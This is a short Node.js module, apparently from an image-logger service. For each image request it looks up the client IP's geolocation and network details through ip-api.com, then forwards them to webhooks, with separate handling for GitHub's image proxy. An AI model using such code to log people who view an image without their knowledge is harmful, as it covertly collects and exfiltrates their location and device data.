const logger = require('./logger')
const { sendImageToWebhooks, sendImageToWebhooksGithub } = require('./webhook')

const ipInfo = async (
  clientIP,
  imageNameWithExtension,
  imagePath,
  os,
  browser,
  userAgent,
  domain
) => {
  if (!clientIP) return

  if (clientIP === '::1') {
    clientIP = '207.97.227.239'
    logger.info(`Webhook it work but I don't want to send it`)
    return
  }

  if (clientIP.substr(0, 7) === '::ffff:') {
    clientIP = clientIP.substr(7)
  }

  if (clientIP !== 'not found') {
    try {
      const infoReq = `http://ip-api.com/json/${clientIP}?fields=16976857`
      const infoRes = await fetch(infoReq)
      const infoJson = await infoRes.json()
      const {
        country,
        regionName,
        city,
        lat,
        lon,
        timezone,
        isp,
        as,
        mobile,
        proxy,
        hosting
      } = infoJson

      logger.info(
        `Client's information: Country: ${country}, Region: ${regionName}, City: ${city}, Coordinates: ${lat}, ${lon}, Timezone: ${timezone}, ISP: ${isp}, AS: ${as}, Mobile: ${mobile}, Proxy: ${proxy}, Hosting: ${hosting}`
      )

      if (
        !userAgent.includes('github-camo') &&
        !userAgent.includes('github.com')
      ) {
        sendImageToWebhooks(
          imageNameWithExtension,
          imagePath,
          clientIP,
          timezone,
          country,
          regionName,
          city,
          lat,
          lon,
          isp,
          as,
          mobile,
          proxy,
          hosting,
          os,
          browser,
          userAgent,
          domain
        )
      } else {
        sendImageToWebhooksGithub(imageNameWithExtension, imagePath, domain)
      }
    } catch (error) {
      logger.error(`Error getting client's information: ${error}`)
    }
  } else {
    logger.error('Client IP not found')
  }

  return
}

module.exports = ipInfo
